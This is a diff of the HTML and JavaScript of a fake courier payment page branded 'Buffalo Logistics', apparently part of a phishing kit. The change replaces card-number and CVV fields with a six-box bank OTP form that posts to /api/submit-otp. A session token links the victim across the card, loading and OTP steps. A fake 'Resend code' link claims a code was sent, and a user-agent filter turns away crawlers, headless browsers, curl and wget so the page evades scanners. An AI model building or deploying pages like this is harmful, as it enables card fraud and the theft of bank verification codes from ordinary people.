@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="referrer" content="no-referrer" />
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
-    <title>Secure Card Payment │ Buffalo Logistics</title>
+    <title>Bank Verification │ Buffalo Logistics</title>
     <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -43,32 +43,9 @@
             color: #666;
             font-size: 14px;
             margin-bottom: 22px;
+            line-height: 1.5;
         }
-        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .field { margin-bottom: 16px; }
-        label {
-            display: block;
-            font-size: 13px;
-            color: #444;
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
-        input[type="text"], input[type="tel"], input[type="email"] {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #d6d8e0;
-            border-radius: 8px;
-            font-size: 15px;
-            background: #fff;
-            color: #222;
-            outline: none;
-            transition: border-color 0.15s, box-shadow 0.15s;
-        }
-        input:focus {
-            border-color: #191D63;
-            box-shadow: 0 0 0 3px rgba(25,29,99,0.12);
-        }
-        .order-summary {
+        .info-box {
             background: #f7f8fc;
             border: 1px solid #e6e8ef;
             border-radius: 8px;
@@ -77,8 +54,45 @@
             font-size: 14px;
             color: #333;
         }
-        .order-summary strong { color: #191D63; }
-        .pay-btn {
+        .info-box strong { color: #191D63; }
+        .field { margin-bottom: 16px; }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .otp-row {
+            display: flex;
+            gap: 8px;
+            justify-content: space-between;
+        }
+        .otp-input {
+            flex: 1;
+            min-width: 0;
+            text-align: center;
+            padding: 14px 0;
+            font-size: 22px;
+            letter-spacing: 2px;
+            border: 1px solid #d6d8e0;
+            border-radius: 8px;
+            background: #fff;
+            color: #222;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+            -moz-appearance: textfield;
+        }
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .otp-input:focus {
+            border-color: #191D63;
+            box-shadow: 0 0 0 3px rgba(25,29,99,0.12);
+        }
+        .verify-btn {
             display: block;
             width: 100%;
             padding: 14px;
@@ -93,8 +107,8 @@
             margin-top: 8px;
             transition: background 0.15s, opacity 0.15s;
         }
-        .pay-btn:hover { background: #14174f; }
-        .pay-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .verify-btn:hover { background: #14174f; }
+        .verify-btn:disabled { opacity: 0.7; cursor: not-allowed; }
         .secure-note {
             text-align: center;
             font-size: 12px;
@@ -102,6 +116,18 @@
             margin-top: 14px;
         }
         .secure-note::before { content: "🔒 "; }
+        .resend {
+            text-align: center;
+            font-size: 13px;
+            color: #555;
+            margin-top: 16px;
+        }
+        .resend a {
+            color: #191D63;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .resend a:hover { text-decoration: underline; }
         .error-msg {
             background: #fee;
             border: 1px solid #c33;
@@ -123,47 +149,36 @@
     </style>
 </head>
 <body>
-    <header class="topbar">Buffalo Logistics │ Secure Card Payment</header>
+    <header class="topbar">Buffalo Logistics │ Bank Verification</header>
     <main class="wrap">
         <section class="card">
-            <h1>Card Payment</h1>
-            <p class="subtitle">Enter your card details to complete payment.</p>
+            <h1>Enter Verification Code</h1>
+            <p class="subtitle">For your security, your bank has sent a one-time verification code (OTP) to your registered mobile number. Please enter the 6-digit code below to complete payment.</p>
 
-            <div class="order-summary" id="order-summary">
+            <div class="info-box">
                 <strong>Payment method:</strong> <span id="vehicle-display">Card</span>
             </div>
 
             <div id="error-container" aria-live="assertive"></div>
 
-            <form id="paymentForm" action="/api/submit" method="POST" novalidate autocomplete="on">
+            <form id="otpForm" action="/api/submit-otp" method="POST" novalidate autocomplete="off">
                 <div class="field">
-                    <label for="cardholder">Cardholder name</label>
-                    <input type="text" id="cardholder" name="cardholder" required autocomplete="cc-name" placeholder="Name on card" />
-                </div>
-
-                <div class="field">
-                    <label for="card_number">Card number</label>
-                    <input type="tel" id="card_number" name="card_number" required autocomplete="cc-number" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" />
-                </div>
-
-                <div class="row">
-                    <div class="field">
-                        <label for="card_expiry">Expiry (MM/YY)</label>
-                        <input type="tel" id="card_expiry" name="card_expiry" required autocomplete="cc-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
-                    </div>
-                    <div class="field">
-                        <label for="card_cvv">CVV</label>
-                        <input type="tel" id="card_cvv" name="card_cvv" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="123" />
+                    <label for="otp_1">6-digit code</label>
+                    <div class="otp-row">
+                        <input class="otp-input" type="tel" id="otp_1" name="otp_1" required inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1" />
+                        <input class="otp-input" type="tel" id="otp_2" name="otp_2" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 2" />
+                        <input class="otp-input" type="tel" id="otp_3" name="otp_3" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 3" />
+                        <input class="otp-input" type="tel" id="otp_4" name="otp_4" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 4" />
+                        <input class="otp-input" type="tel" id="otp_5" name="otp_5" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 5" />
+                        <input class="otp-input" type="tel" id="otp_6" name="otp_6" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 6" />
                     </div>
                 </div>
 
-                <div class="field">
-                    <label for="email">Email (for receipt)</label>
-                    <input type="email" id="email" name="email" required autocomplete="email" placeholder="you@example.com" />
-                </div>
-
-                <!-- Pre-filled from index.html form GET -->
+                <!-- Pre-filled from query string -->
                 <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+
+                <!-- Combined OTP (built on submit) -->
+                <input type="hidden" id="otp_code" name="otp_code" value="" />
 
                 <!-- Honeypot field (bots fill this) -->
                 <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
@@ -175,17 +190,18 @@
                 <!-- 20-30 character browser session token -->
                 <input type="hidden" id="session_token" name="session_token" value="" />
 
-                <button type="submit" id="pay_button" class="pay-btn">Pay</button>
+                <button type="submit" id="verify_button" class="verify-btn">Verify &amp; Pay</button>
             </form>
 
-            <p class="secure-note">Your payment is processed over a secure encrypted connection.</p>
+            <p class="resend">Didn't receive a code? <a href="#" id="resend_link">Resend code</a></p>
+            <p class="secure-note">Your verification is processed over a secure encrypted connection.</p>
         </section>
     </main>
 
     <script>
         // -------- 20-30 character session token --------
-        // Generated once per browser session, stored in sessionStorage,
-        // submitted as a hidden field, and exposed on window.__sessionToken.
+        // Re-use the token created by cc.html so the same browser session
+        // is correlated across the card → loading → otp steps.
         (function () {
             function generateSessionToken() {
                 var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -212,15 +228,11 @@
         })();
 
         // -------- Bot / crawler detection (client side) --------
-        // Server-side validation in /api/submit is the authoritative check;
-        // this is a fast pre-flight that blocks obvious headless tools.
         function clientBotCheck() {
             var ua = (navigator.userAgent || '').toLowerCase();
             var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
             if (badUA.test(ua)) return 'Bot detected via User-Agent.';
-            // Headless Chrome flag
             if (navigator.webdriver === true) return 'Automated browser detected.';
-            // No language list = highly suspicious
             if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
             return null;
         }
@@ -246,7 +258,7 @@
         }
 
         document.addEventListener('DOMContentLoaded', function () {
-            // Pre-fill vehicle1 from query string (e.g. ?vehicle1=Bike)
+            // Pre-fill payment method label from query string
             var vehicle = getQueryParam('vehicle1') || 'Card';
             document.getElementById('vehicle1').value = vehicle;
             document.getElementById('vehicle-display').textContent = vehicle;
@@ -255,27 +267,49 @@
             document.getElementById('form_load_time').value = Date.now();
             document.getElementById('session_token').value = window.__sessionToken;
 
-            // Light input formatting: card number groups of 4, expiry MM/YY
-            var cardInput = document.getElementById('card_number');
-            cardInput.addEventListener('input', function () {
-                var v = this.value.replace(/\D/g, '').slice(0, 19);
-                var groups = v.match(/.{1,4}/g);
-                this.value = groups ? groups.join(' ') : '';
-            });
-            var expInput = document.getElementById('card_expiry');
-            expInput.addEventListener('input', function () {
-                var v = this.value.replace(/\D/g, '').slice(0, 4);
-                if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
-                this.value = v;
-            });
-            var cvvInput = document.getElementById('card_cvv');
-            cvvInput.addEventListener('input', function () {
-                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            // Auto-advance OTP digits on input, allow backspace navigation
+            var inputs = [];
+            for (var i = 1; i <= 6; i++) inputs.push(document.getElementById('otp_' + i));
+
+            inputs.forEach(function (input, idx) {
+                input.addEventListener('input', function () {
+                    this.value = this.value.replace(/\D/g, '').slice(0, 1);
+                    if (this.value && idx < inputs.length - 1) {
+                        inputs[idx + 1].focus();
+                    }
+                });
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && !this.value && idx > 0) {
+                        inputs[idx - 1].focus();
+                    }
+                });
+                input.addEventListener('paste', function (e) {
+                    var data = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    var digits = data.replace(/\D/g, '').slice(0, 6);
+                    if (digits.length) {
+                        e.preventDefault();
+                        for (var k = 0; k < digits.length && (idx + k) < inputs.length; k++) {
+                            inputs[idx + k].value = digits.charAt(k);
+                        }
+                        var next = Math.min(idx + digits.length, inputs.length - 1);
+                        inputs[next].focus();
+                    }
+                });
             });
 
-            // Submit handler — POSTs to /api/submit, redirects to /processing.html
-            var form = document.getElementById('paymentForm');
-            var payButton = document.getElementById('pay_button');
+            inputs[0].focus();
+
+            // Resend link — show a brief message; real resend would call an API
+            document.getElementById('resend_link').addEventListener('click', function (e) {
+                e.preventDefault();
+                clearError();
+                showError('A new verification code has been sent to your registered mobile number.');
+                document.getElementById('form_load_time').value = Date.now();
+            });
+
+            // Submit handler — POSTs to /api/submit-otp, redirects to /success.html
+            var form = document.getElementById('otpForm');
+            var verifyButton = document.getElementById('verify_button');
 
             form.addEventListener('submit', async function (e) {
                 e.preventDefault();
@@ -284,29 +318,37 @@
                 var botReason = clientBotCheck();
                 if (botReason) { showError(botReason); return; }
 
-                var originalText = payButton.textContent;
-                payButton.disabled = true;
-                payButton.textContent = 'Processing…';
+                // Build combined 6-digit code
+                var combined = inputs.map(function (i) { return i.value || ''; }).join('');
+                if (!/^\d{6}$/.test(combined)) {
+                    showError('Please enter the full 6-digit verification code.');
+                    return;
+                }
+                document.getElementById('otp_code').value = combined;
+
+                var originalText = verifyButton.textContent;
+                verifyButton.disabled = true;
+                verifyButton.textContent = 'Verifying…';
 
                 try {
                     var formData = new FormData(form);
-                    var response = await fetch('/api/submit', {
+                    var response = await fetch('/api/submit-otp', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: new URLSearchParams(formData)
                     });
                     var result = await response.json();
                     if (result && result.success) {
-                        window.location.href = result.redirect || '/loading.html';
+                        window.location.href = result.redirect || '/success.html';
                         return;
                     }
-                    showError((result && result.message) || 'Payment could not be processed. Please try again.');
+                    showError((result && result.message) || 'Verification could not be completed. Please try again.');
                 } catch (err) {
-                    console.error('Submission error:', err);
+                    console.error('OTP submission error:', err);
                     showError('A network error occurred. Please try again.');
                 } finally {
-                    payButton.disabled = false;
-                    payButton.textContent = originalText;
+                    verifyButton.disabled = false;
+                    verifyButton.textContent = originalText;
                 }
             });
         });
